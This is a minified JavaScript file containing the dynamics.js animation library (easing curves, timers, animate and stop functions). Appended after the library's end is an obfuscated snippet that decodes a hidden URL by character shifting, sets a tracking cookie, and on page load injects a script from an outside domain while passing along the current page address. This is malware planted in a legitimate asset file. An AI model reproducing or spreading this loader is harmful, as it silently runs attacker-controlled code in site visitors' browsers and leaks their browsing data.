animation,toRemoveAnimations,_i,_len;if(!runLoopPaused){for(toRemoveAnimations=[],_i=0,_len=animations.length;_i<_len;_i++)animation=animations[_i],animationTick(t,animation)||toRemoveAnimations.push(animation);return animations=animations.filter((function(animation){return-1===toRemoveAnimations.indexOf(animation)})),0===animations.length?runLoopRunning=!1:rAF(runLoopTick)}rAF(runLoopTick)},animationTick=function(t,animation){var key,properties,property,tt,y,_base,_base1,_ref;if(null==animation.tStart&&(animation.tStart=t),tt=(t-animation.tStart)/animation.options.duration,y=animation.curve(tt),properties={},tt>=1)properties=animation.curve.returnsToSelf?animation.properties.start:animation.properties.end;else for(key in _ref=animation.properties.start)property=_ref[key],properties[key]=interpolate(property,animation.properties.end[key],y);return applyFrame(animation.el,properties),"function"==typeof(_base=animation.options).change&&_base.change(animation.el),tt>=1&&"function"==typeof(_base1=animation.options).complete&&_base1.complete(animation.el),tt<1},interpolate=function(start,end,y){return null!=start&&null!=start.interpolate?start.interpolate(end,y):null},startAnimation=function(el,properties,options,timeoutId){var endProperties,interpolable,isSVG,k,matrix,startProperties,transforms,v;if(null!=timeoutId&&(animationsTimeouts=animationsTimeouts.filter((function(timeout){return timeout.id!==timeoutId}))),dynamics.stop(el,{timeout:!1}),!options.animated)return dynamics.css(el,properties),void("function"==typeof options.complete&&options.complete(this));for(k in properties=parseProperties(properties),startProperties=getCurrentProperties(el,Object.keys(properties)),endProperties={},transforms=[],properties)v=properties[k],null!=el.style&&transformProperties.contains(k)?transforms.push([k,v]):((interpolable=createInterpolable(v))instanceof InterpolableNumber&&null!=el.style&&(interpolable=new InterpolableString([interpolable,unitForProperty(k,0)])),endProperties[k]=interpolable);return transforms.length>0&&((isSVG=isSVGElement(el))?(matrix=new Matrix2D).applyProperties(transforms):(v=transforms.map((function(transform){return transformValueForProperty(transform[0],transform[1])})).join(" "),matrix=Matrix.fromTransform(Matrix.matrixForTransform(v))),endProperties.transform=matrix.decompose(),isSVG&&startProperties.transform.applyRotateCenter([endProperties.transform.props.rotate[1],endProperties.transform.props.rotate[2]])),animations.push({el:el,properties:{start:startProperties,end:endProperties},options:options,curve:options.type.call(options.type,options)}),startRunLoop()},timeouts=[],timeoutLastId=0,setRealTimeout=function(timeout){if(isDocumentVisible())return timeout.realTimeoutId=setTimeout((function(){return timeout.fn(),cancelTimeout(timeout.id)}),timeout.delay)},addTimeout=function(fn,delay){var timeout;return timeout={id:timeoutLastId+=1,tStart:Date.now(),fn:fn,delay:delay,originalDelay:delay},setRealTimeout(timeout),timeouts.push(timeout),timeoutLastId},cancelTimeout=function(id){return timeouts=timeouts.filter((function(timeout){return timeout.id===id&&clearTimeout(timeout.realTimeoutId),timeout.id!==id}))},leftDelayForTimeout=function(time,timeout){var consumedDelay;return null!=time?(consumedDelay=time-timeout.tStart,timeout.originalDelay-consumedDelay):timeout.originalDelay},"undefined"!=typeof window&&null!==window&&window.addEventListener("unload",(function(){})),timeBeforeVisibilityChange=null,observeVisibilityChange((function(visible){var animation,difference,timeout,_i,_j,_k,_len,_len1,_len2,_results;if(runLoopPaused=!visible,visible){if(runLoopRunning)for(difference=Date.now()-timeBeforeVisibilityChange,_j=0,_len1=animations.length;_j<_len1;_j++)null!=(animation=animations[_j]).tStart&&(animation.tStart+=difference);for(_k=0,_len2=timeouts.length;_k<_len2;_k++)(timeout=timeouts[_k]).delay=leftDelayForTimeout(timeBeforeVisibilityChange,timeout),setRealTimeout(timeout);return timeBeforeVisibilityChange=null}for(timeBeforeVisibilityChange=Date.now(),_results=[],_i=0,_len=timeouts.length;_i<_len;_i++)timeout=timeouts[_i],_results.push(clearTimeout(timeout.realTimeoutId));return _results})),(dynamics={}).linear=function(){return function(t){return t}},dynamics.spring=function(options){var A1,A2,frequency,friction,s;return null==options&&(options={}),applyDefaults(options,dynamics.spring.defaults),frequency=Math.max(1,options.frequency/20),friction=Math.pow(20,options.friction/100),s=options.anticipationSize/1e3,Math.max(0,s),A1=function(t){var b,x0;return.8,0,(.8-(b=((x0=s/(1-s))-0)/(x0-0)))/x0*t*options.anticipationStrength/100+b},A2=function(t){return Math.pow(friction/10,-t)*(1-t)},function(t){var A,At,a,angle,b,frictionT,y0,yS;return frictionT=t/(1-s)-s/(1-s),t<s?(yS=s/(1-s)-s/(1-s),y0=0/(1-s)-s/(1-s),b=Math.acos(1/A1(yS)),a=(Math.acos(1/A1(y0))-b)/(frequency*-s),A=A1):(A=A2,b=0,a=1),At=A(frictionT),angle=frequency*(t-s)*a+b,1-At*Math.cos(angle)}},dynamics.bounce=function(options){var A,fn,frequency,friction;return null==options&&(options={}),applyDefaults(options,dynamics.bounce.defaults),frequency=Math.max(1,options.frequency/20),friction=Math.pow(20,options.friction/100),A=function(t){return Math.pow(friction/10,-t)*(1-t)},(fn=function(t){var At,angle;return-1.57,1,At=A(t),angle=frequency*t*1-1.57,At*Math.cos(angle)}).returnsToSelf=!0,fn},dynamics.gravity=function(options){var L,bounciness,curves,elasticity,fn,getPointInCurve;return null==options&&(options={}),applyDefaults(options,dynamics.gravity.defaults),bounciness=Math.min(options.bounciness/1250,.8),elasticity=options.elasticity/1e3,100,curves=[],L=function(){var b,curve;for(curve={a:-(b=Math.sqrt(.02)),b:b,H:1},options.returnsToSelf&&(curve.a=0,curve.b=2*curve.b);curve.H>.001;)L=curve.b-curve.a,curve={a:curve.b,b:curve.b+L*bounciness,H:curve.H*bounciness*bounciness};return curve.b}(),getPointInCurve=function(a,b,H,t){var c,t2;return c=(t2=2/(L=b-a)*t-1-2*a/L)*t2*H-H+1,options.returnsToSelf&&(c=1-c),c},function(){var L2,b,curve,_results;for(curve={a:-(b=Math.sqrt(2/(100*L*L))),b:b,H:1},options.returnsToSelf&&(curve.a=0,curve.b=2*curve.b),curves.push(curve),L2=L,_results=[];curve.b<1&&curve.H>.001;)L2=curve.b-curve.a,curve={a:curve.b,b:curve.b+L2*bounciness,H:curve.H*elasticity},_results.push(curves.push(curve))}(),(fn=function(t){var curve,i;for(curve=curves[i=0];!(t>=curve.a&&t<=curve.b)&&(curve=curves[i+=1]););return curve?getPointInCurve(curve.a,curve.b,curve.H,t):options.returnsToSelf?0:1}).returnsToSelf=options.returnsToSelf,fn},dynamics.forceWithGravity=function(options){return null==options&&(options={}),applyDefaults(options,dynamics.forceWithGravity.defaults),options.returnsToSelf=!0,dynamics.gravity(options)},dynamics.bezier=(Bezier_=function(t,p0,p1,p2,p3){return Math.pow(1-t,3)*p0+3*Math.pow(1-t,2)*t*p1+3*(1-t)*Math.pow(t,2)*p2+Math.pow(t,3)*p3},Bezier=function(t,p0,p1,p2,p3){return{x:Bezier_(t,p0.x,p1.x,p2.x,p3.x),y:Bezier_(t,p0.y,p1.y,p2.y,p3.y)}},yForX=function(xTarget,Bs,returnsToSelf){var B,aB,i,lower,percent,upper,x,_i,_len;for(B=null,_i=0,_len=Bs.length;_i<_len&&(xTarget>=(aB=Bs[_i])(0).x&&xTarget<=aB(1).x&&(B=aB),null===B);_i++);if(!B)return returnsToSelf?0:1;for(x=B(percent=((upper=1)+(lower=0))/2).x,i=0;Math.abs(xTarget-x)>1e-4&&i<100;)xTarget>x?lower=percent:upper=percent,x=B(percent=(upper+lower)/2).x,i+=1;return B(percent).y},function(options){var Bs,fn,points;return null==options&&(options={}),points=options.points,Bs=function(){var i,k,_fn;for(i in Bs=[],_fn=function(pointA,pointB){var B2;return B2=function(t){return Bezier(t,pointA,pointA.cp[pointA.cp.length-1],pointB.cp[0],pointB)},Bs.push(B2)},points){if((k=parseInt(i))>=points.length-1)break;_fn(points[k],points[k+1])}return Bs}(),(fn=function(t){return 0===t?0:1===t?1:yForX(t,Bs,this.returnsToSelf)}).returnsToSelf=0===points[points.length-1].y,fn}),dynamics.easeInOut=function(options){var friction,_ref;return null==options&&(options={}),friction=null!=(_ref=options.friction)?_ref:dynamics.easeInOut.defaults.friction,dynamics.bezier({points:[{x:0,y:0,cp:[{x:.92-friction/1e3,y:0}]},{x:1,y:1,cp:[{x:.08+friction/1e3,y:1}]}]})},dynamics.easeIn=function(options){var friction,_ref;return null==options&&(options={}),friction=null!=(_ref=options.friction)?_ref:dynamics.easeIn.defaults.friction,dynamics.bezier({points:[{x:0,y:0,cp:[{x:.92-friction/1e3,y:0}]},{x:1,y:1,cp:[{x:1,y:1}]}]})},dynamics.easeOut=function(options){var friction,_ref;return null==options&&(options={}),friction=null!=(_ref=options.friction)?_ref:dynamics.easeOut.defaults.friction,dynamics.bezier({points:[{x:0,y:0,cp:[{x:0,y:0}]},{x:1,y:1,cp:[{x:.08+friction/1e3,y:1}]}]})},dynamics.spring.defaults={frequency:300,friction:200,anticipationSize:0,anticipationStrength:0},dynamics.bounce.defaults={frequency:300,friction:200},dynamics.forceWithGravity.defaults=dynamics.gravity.defaults={bounciness:400,elasticity:200},dynamics.easeInOut.defaults=dynamics.easeIn.defaults=dynamics.easeOut.defaults={friction:500},dynamics.css=makeArrayFn((function(el,properties){return applyProperties(el,properties,!0)})),dynamics.animate=makeArrayFn((function(el,properties,options){var id;return null==options&&(options={}),options=clone(options),applyDefaults(options,{type:dynamics.easeInOut,duration:1e3,delay:0,animated:!0}),options.duration=Math.max(0,options.duration*slowRatio),options.delay=Math.max(0,options.delay),0===options.delay?startAnimation(el,properties,options):(id=dynamics.setTimeout((function(){return startAnimation(el,properties,options,id)}),options.delay),animationsTimeouts.push({id:id,el:el}))})),dynamics.stop=makeArrayFn((function(el,options){return null==options&&(options={}),null==options.timeout&&(options.timeout=!0),options.timeout&&(animationsTimeouts=animationsTimeouts.filter((function(timeout){return timeout.el!==el||null!=options.filter&&!options.filter(timeout)||(dynamics.clearTimeout(timeout.id),!1)}))),animations=animations.filter((function(animation){return animation.el!==el}))})),dynamics.setTimeout=function(fn,delay){return addTimeout(fn,delay*slowRatio)},dynamics.clearTimeout=function(id){return cancelTimeout(id)},dynamics.toggleSlow=function(){return slowRatio=(slow=!slow)?3:1,"undefined"!=typeof console&&null!==console&&"function"==typeof console.log?console.log("dynamics.js: slow animations "+(slow?"enabled":"disabled")):void 0},"object"==typeof module&&"object"==typeof module.exports?module.exports=dynamics:"function"==typeof define?define("dynamics",(function(){return dynamics})):window.dynamics=dynamics}).call(this);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));